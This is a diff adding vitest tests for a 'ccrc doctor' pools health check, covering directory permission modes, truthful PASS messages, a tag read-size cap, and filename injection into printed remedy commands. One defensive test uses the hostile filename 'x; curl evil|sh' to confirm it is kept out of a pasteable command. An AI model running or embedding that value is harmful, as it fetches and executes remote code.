@@ -3863,6 +3863,291 @@ describe('ccrc doctor: pools', () => {
       expect(lines[lines.indexOf(v) + 1]).toMatch(/^ {2}remedy: \S/);
     }
   });
+
+  // ── HOW THE `Mutation, measured` NOTES BELOW WERE TAKEN ─────────────────
+  // `runDoctor` runs the SHIPPED `ccd/ccrc-doctor-checks` (`installCcrc`
+  // symlinks it into the fixture box), so a mutated build cannot be reached
+  // through it and the production fix cannot be un-shipped to measure the
+  // red. Each note below was therefore taken the way `pool-name-parity.test.ts`
+  // runs that same file: the checks file copied to a scratchpad, the ONE guard
+  // under test reverted there, and the copy sourced standalone under `set -u`
+  // with an empty PATH (`. <copy>; _check_pools`). The replay HOME is minimal
+  // — the `pools/` tags, the `projects/` directories and the `accounts.sh`
+  // this check reads, and nothing else, since `healthy()`'s other artifacts
+  // belong to other checks — so what the replay measures is the VERDICT LINE,
+  // the same string these assertions read, and not vitest's own red, which is
+  // the one thing a scratchpad copy cannot produce.
+
+  // ── `-r` AND `-x` ARE DIFFERENT QUESTIONS (fix round 7, fold b) ──────────
+  // Until this round `_check_pools` folded them into one FAIL
+  // (`[ ! -d ] || [ ! -r ] || [ ! -x ]`), so a `pools/` at mode `--x` — every
+  // tag reachable, none of them listable — was reported `pools-unlistable: …
+  // so no project's tag can be read — ccd reads this same path`, which is
+  // false in both halves. The AUTHORITY is `_project_pool_state`
+  // (`ccd/ccd:1078`): it stats ONE known path (`$POOLS_DIR/<project>`) and
+  // never enumerates, so SEARCH is all it needs and LIST is what only this
+  // check needs.
+  //
+  // Measured against that real reader, on exactly the two fixtures the pair
+  // of tests below builds (`. ccd/ccd; _project_pool_state demo`, fixture
+  // HOME, one legal tag under `pools/`):
+  //     pools/ at 0111 (searchable, not listable) -> `named pool-a`
+  //     pools/ at 0444 (listable, not searchable) -> `unreadable`
+  // The doctor now agrees with the authority in both directions, and these
+  // two tests are one pin each on one of those directions.
+  it.skipIf(process.getuid?.() === 0)(
+    'WARNS pools-unenumerable, never FAILS, for a pools/ that is searchable but not listable', () => {
+      // The direction the fold got WRONG. `ccd` places work for this box
+      // perfectly; the only thing broken is this check's own eyesight, so the
+      // class has to be the one whose CLAIM is "everything works, nobody can
+      // audit it" — a separate word from `pools-unlistable`, not a softer
+      // tone on the same one.
+      //
+      // Mutation, measured: `ccd/ccrc-doctor-checks` copied to the scratchpad
+      // with the split reverted (the FAIL test back to `[ ! -d "$dir" ] ||
+      // [ ! -r "$dir" ] || [ ! -x "$dir" ]` and the `pools-unenumerable` WARN
+      // block deleted) answers this fixture `FAIL pools: pools-unlistable: …`
+      // — so all three assertions below red on that copy and pass on the tree.
+      //
+      // Skipped as root: root searches and lists any directory, so the
+      // fixture cannot be built — the same reason the mode-000 cases above
+      // skip.
+      const home = healthy('ccrc-doctor-pools-unenumerable-');
+      pooledRoster(home);
+      project(home, 'demo');
+      tag(home, 'demo', 'pool-a');
+      const d = join(home, '.cc-sessions', 'pools');
+      chmodSync(d, 0o111);
+      try {
+        const out = runDoctor(home).stdout;
+        const line = lineFor(out, 'pools');
+        expect(line, `no pools verdict line:\n${out}`).toMatch(/^WARN pools: /);
+        expect(line).toContain('pools-unenumerable');
+        // The old verdict, by name: a doctor that FAILs a box `ccd` is happy
+        // with is the cross-file disagreement this whole wave keeps finding,
+        // pointed at itself.
+        expect(out).not.toContain('pools-unlistable');
+      } finally {
+        chmodSync(d, 0o755);
+      }
+    });
+
+  it.skipIf(process.getuid?.() === 0)(
+    'still FAILS pools-unlistable for a pools/ that is listable but not searchable', () => {
+      // The direction the split must NOT have cost. `-r` alone becoming a
+      // WARN is only correct because `-x` is still a FAIL on its own: at 0444
+      // the reader answers `unreadable` for EVERY project (measured, above),
+      // so this is the verdict that agrees with it.
+      //
+      // Mutation, measured: this test does NOT detect the reverted fold —
+      // that copy FAILs `pools-unlistable` here too, exactly as the tree does,
+      // and says nothing this assertion can see. What it DOES detect is the
+      // split going one step too far: a scratchpad copy whose FAIL test lost
+      // its `-x` arm (`if [ ! -d "$dir" ]; then`) answers this same fixture
+      // `PASS pools: every project tag … is one legal pool name, names a
+      // project that exists, and names a pool this box's roster carries` —
+      // the THREE-clause sentence, because this fixture calls `pooledRoster`
+      // (an earlier draft of this note quoted the roster-less branch's
+      // opening instead, which this fixture cannot produce; re-measured
+      // through vitest's own AssertionError) — because a 0444 directory globs fine and then
+      // every `[ -e "$f" ]` inside it is false — the most reassuring PASS this
+      // check has, on a box where no placement decision can be made at all.
+      // That copy reds both assertions below.
+      const home = healthy('ccrc-doctor-pools-unsearchable-');
+      pooledRoster(home);
+      project(home, 'demo');
+      tag(home, 'demo', 'pool-a');
+      const d = join(home, '.cc-sessions', 'pools');
+      chmodSync(d, 0o444);
+      try {
+        const out = runDoctor(home).stdout;
+        const line = lineFor(out, 'pools');
+        expect(line, `no pools verdict line:\n${out}`).toMatch(/^FAIL pools: /);
+        expect(line).toContain('pools-unlistable');
+      } finally {
+        chmodSync(d, 0o755);
+      }
+    });
+
+  // ── A PASS MAY NOT CLAIM A CHECK IT SKIPPED (fix round 7, fold a) ────────
+  // The orphan arm measures a tag's pool against `~/.ccrc/accounts.sh`, the
+  // generated roster projection — and when that file cannot be read it makes
+  // NO claim (`known` stays empty). NOTHING ELSE IN THE DOCTOR REPORTS THAT
+  // FILE, which an earlier draft of this comment and of the production
+  // sentence both got wrong: `_check_wrappers` holds zero occurrences of
+  // `accounts.sh` and reads `accounts.json`, answering PASS on a box with the
+  // JSON and no projection, and `_check_graphify` sources the projection when
+  // it can and silently skips when it cannot. Measured on a full `ccrc
+  // doctor` run over exactly this shape: the only line naming `accounts.sh`
+  // is the pools PASS itself. The single PASS sentence that stood here
+  // asserted the third clause, "names a pool this box's roster carries",
+  // regardless — a PASS reporting a check that never ran, which is the same
+  // false-PASS shape the `$reg`-unsearchable guard above was written for.
+  //
+  // MEASURED, NOT ASSUMED, about the fixture: `healthy()` writes
+  // `~/.ccrc/accounts.json` (`writeRoster`) and NEVER `~/.ccrc/accounts.sh` —
+  // its own comment says so and the assertion below re-measures it, so this
+  // test needs nothing removed or chmod-ed, only `pooledRoster` not called.
+  it('PASSES without claiming the roster half when ~/.ccrc/accounts.sh is ABSENT', () => {
+    // ABSENT is what this fixture measures, and the title says so. Production
+    // gates on `[ -r … ]`, which collapses absent and present-but-unreadable
+    // deliberately — one condition, one answer — so a mode-000 projection is
+    // NOT exercised here and this test makes no claim about it.
+    // Mutation, measured: a scratchpad copy whose final PASS is the single
+    // pre-fix sentence answers this fixture `PASS pools: … , names a project
+    // that exists, and names a pool this box's roster carries` — which reds
+    // the last two of the three assertions below (the `PASS pools: ` one
+    // stays green on that copy, which is the whole defect: it is still a
+    // PASS, it just reports a check that never ran).
+    const home = healthy('ccrc-doctor-pools-no-vocab-');
+    expect(existsSync(join(home, '.ccrc', 'accounts.sh')),
+      'the fixture is not the no-roster-projection box').toBe(false);
+    project(home, 'demo');
+    tag(home, 'demo', 'pool-a');
+    const line = lineFor(runDoctor(home).stdout, 'pools');
+    expect(line).toMatch(/^PASS pools: /);
+    expect(line).toContain('the pool-vocabulary half is UNMEASURED');
+    expect(line).not.toContain("names a pool this box's roster carries");
+  });
+
+  it('DOES claim the roster half when ~/.ccrc/accounts.sh was read', () => {
+    // The mirror, and without it the pin above is satisfied by a check that
+    // never claims the third clause at all — which would be a doctor that
+    // stopped reporting the orphan arm's agreement entirely.
+    //
+    // Mutation, measured: a scratchpad copy whose final PASS is only the
+    // UNMEASURED sentence answers this fixture with it, and this test reds
+    // while the one above stays green.
+    const home = healthy('ccrc-doctor-pools-vocab-');
+    pooledRoster(home);
+    project(home, 'demo');
+    tag(home, 'demo', 'pool-a');
+    const line = lineFor(runDoctor(home).stdout, 'pools');
+    expect(line).toMatch(/^PASS pools: /);
+    expect(line).toContain("names a pool this box's roster carries");
+    expect(line).not.toContain('UNMEASURED');
+  });
+
+  // ── A FILESYSTEM-DERIVED NAME MAY NOT RIDE INSIDE A COMMAND ─────────────
+  // The `pools-stale` remedy is the exact command an operator is invited to
+  // paste, and its `<project>` argument is a FILENAME read off disk. A tag
+  // file named `x; curl evil|sh` rendered `remedy: clear each: ccd
+  // project-pool --project x; curl evil|sh --clear` — three commands, two of
+  // them the filename's. Not an escalation (writing under `pools/` already
+  // needs code execution as this user), and that is exactly why it is worth
+  // fixing rather than arguing about: this check's whole value is that what
+  // it prints can be trusted.
+  //
+  // THE TWO SURFACES ARE DIFFERENT AND ONLY ONE IS FILTERED. The verdict
+  // MESSAGE still names the file — it is printed, never executed, and an
+  // operator who cannot see the offending name cannot go delete it. The
+  // REMEDY is the one an operator runs, so the charset gate lives there.
+  it('keeps a hostile stale FILENAME out of the remedy while still naming it in the verdict', () => {
+    // Mutation, measured: a scratchpad copy with the charset gate reverted
+    // (every stale name appended to `p_stale_cmds` unfiltered, the omission
+    // counter gone) answers this fixture `remedy: clear each: ccd project-pool
+    // --project x; curl evil|sh --clear` — which reds the three remedy
+    // assertions below (no `curl`, the omission sentence, the count). The
+    // `/^ {2}remedy: \S/` shape assertion and BOTH verdict assertions stay
+    // green on that copy, which is the point of asserting them: the defect
+    // was never a missing line or a missing name.
+    const home = healthy('ccrc-doctor-pools-stale-hostile-');
+    pooledRoster(home);
+    const hostile = 'x; curl evil|sh';
+    tag(home, hostile, 'pool-a');   // no projects/<name>, no *.project row
+    const lines = runDoctor(home).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-stale'));
+    expect(i, `no pools-stale line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+    expect(lines[i]).toContain(hostile);
+    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
+    expect(lines[i + 1]).not.toContain('curl');
+    expect(lines[i + 1]).toContain('NOT printed as a command');
+    expect(lines[i + 1]).toMatch(/\b1 name/);
+  });
+
+  it('still prints the exact clear command for an ordinary stale name on the same box', () => {
+    // The companion, and it is not decoration: a gate that omitted EVERY name
+    // would satisfy the test above completely while leaving the remedy with
+    // no command in it at all — a WARN whose cure is "go work it out". One
+    // box, two stale tags, and the remedy has to carry the legal one's exact
+    // command AND the count of what it would not print.
+    //
+    // Mutation, measured: a scratchpad copy whose `case` omits every name
+    // (`*) p_stale_omit=$((p_stale_omit + 1)); continue ;;`) answers this
+    // fixture `remedy: 2 name(s) are NOT printed as a command: …` with no
+    // `ccd project-pool` in it — which reds the first and third assertions
+    // below (the count moves to 2 as well), while the `curl` one stays green:
+    // omitting everything is safe and useless, and only the command half
+    // says so.
+    const home = healthy('ccrc-doctor-pools-stale-mixed-');
+    pooledRoster(home);
+    tag(home, 'x; curl evil|sh', 'pool-a');
+    tag(home, 'quiet-basin', 'pool-a');
+    const lines = runDoctor(home).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-stale'));
+    expect(i, `no pools-stale line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+    expect(lines[i + 1]).toContain('ccd project-pool --project quiet-basin --clear');
+    expect(lines[i + 1]).not.toContain('curl');
+    expect(lines[i + 1]).toMatch(/\b1 name/);
+  });
+
+  // ── THE DOCTOR'S OWN SIZE CAP (fix round 7) ──────────────────────────────
+  // `read -r -d '' -n 64` is the READER's gate, inherited here for the reason
+  // every per-tag arm in this loop is: a doctor that read a tag differently
+  // from the file that obeys it reports on a rule nobody enforces. Twice the
+  // 32-character grammar, so no legal tag can reach it; without it a
+  // `pools/<p>` symlinked at a growing log is slurped whole into a variable
+  // by the one tool an operator runs when the box is already sick.
+  //
+  // THE WHITESPACE PAIR IS WHAT DETECTS THE MUTATION, and a big junk file is
+  // NOT — the same fact `ccd`'s own cap test rests on. Measured on a
+  // scratchpad copy with `-n 64` removed:
+  //     `pool-a` + 100 spaces (106 bytes) -> PASS      (tree: pools-malformed)
+  //     `pool-a` +  50 spaces  (56 bytes) -> PASS      (tree: PASS)
+  //     1 MB of junk                      -> pools-malformed, WITH AND
+  //                                          WITHOUT the cap
+  // The junk file answers malformed either way because its bytes are not a
+  // pool name whether 64 of them or a million are read. What DOES tell the
+  // two builds apart is a file that is LEGAL WHEN READ WHOLE and longer than
+  // the cap — trailing whitespace being the cheapest such tail, since the
+  // strip would make it legal. Re-measured in the same round, because the
+  // sentence that stood here named a different criterion ("first 64 bytes
+  // legal, tail not") and was false: `pool-a` + 58 spaces + `!!!` (67 bytes)
+  // matches THAT description and answers `pools-malformed` on the tree and on
+  // the cap-deleted copy alike, telling the builds apart not at all. Nor does
+  // the over-cap row reach the strip or the grammar test: `read -r -d '' -n 64`
+  // stops short of EOF, returns 0, and the branch at `ccrc-doctor-checks:2882`
+  // buckets `p_malformed` immediately.
+  it('caps its read: 106 bytes of tag is malformed, 56 bytes is legal', () => {
+    // WHAT THIS PAIR IS EVIDENCE FOR, EXACTLY: a cap somewhere in [56, 105].
+    // It is not evidence for 64, and it is not evidence that the number is
+    // the READER's — a `-n 80` build keeps both halves green (measured), and
+    // nothing in this file compares the two literals. The title used to say
+    // "applies the reader's 64-byte cap" and measured neither word. The
+    // cross-file half is pinned where this repo pins cross-file spellings:
+    // `pool-name-parity.test.ts` holds the doctor's `-n` literal equal to
+    // `ccd/ccd`'s, alongside the grammar and the directory name.
+    //
+    // Mutation, measured, in the OTHER direction too: a copy with the cap
+    // TIGHTENED to `-n 8` answers the 56-byte fixture `FAIL pools:
+    // pools-malformed` — so the second half below is a pin on the cap's
+    // value being large enough, not only on its presence.
+    const over = healthy('ccrc-doctor-pools-overcap-');
+    pooledRoster(over);
+    project(over, 'demo');
+    tag(over, 'demo', `pool-a${' '.repeat(100)}`);
+    const lines = runDoctor(over).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-malformed'));
+    expect(i, `no pools-malformed line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+    expect(lines[i]).toContain('demo');
+
+    const under = healthy('ccrc-doctor-pools-undercap-');
+    pooledRoster(under);
+    project(under, 'demo');
+    tag(under, 'demo', `pool-a${' '.repeat(50)}`);
+    const line = lineFor(runDoctor(under).stdout, 'pools');
+    expect(line, 'a 56-byte tag is under the cap and strips to a legal name').toMatch(/^PASS pools: /);
+  });
 });
 
 // ── the two boxes' matched set ────────────────────────────────────────────
